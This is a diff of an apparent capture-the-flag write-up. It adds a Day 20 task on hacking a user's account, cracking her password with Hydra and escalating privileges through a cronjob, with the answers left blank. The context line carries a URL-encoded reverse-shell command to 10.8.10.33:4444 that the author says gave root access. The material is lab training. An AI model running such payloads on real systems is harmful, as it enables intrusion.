@@ -1124,6 +1124,26 @@ sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.10.33%2F4444%200%3E%261
 ```
 This payload give me a reverse shell with root privileges after that i go to `/home/bestadmin` directory and there i got the user flag 
 
+## Task 25  [Day 20] Cronjob Privilege Escalation
+
+You think the evil Christmas monster is acting on Elf Sam's account!
+
+Hack into her account and escalate your privileges on this Linux machine.
+
+There is no supporting material - the only new concept in this challenge is Linux cronjobs. Join our [Discord](https://discord.gg/wvfe3XJ) if you're really struggling.
+
+**Answer the questions below**
+
+Q1: What port is SSH running on?
+**Hint: Use nmap to enumerate services on ports 4000 and 5000.**
+A:
+
+Q2: Crack sam's password and read flag1.txt
+**Hint: Complete the challenge on day 17, to understand how to use Hydra.**
+A:
+
+Q3: Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?
+A:
 
 
 
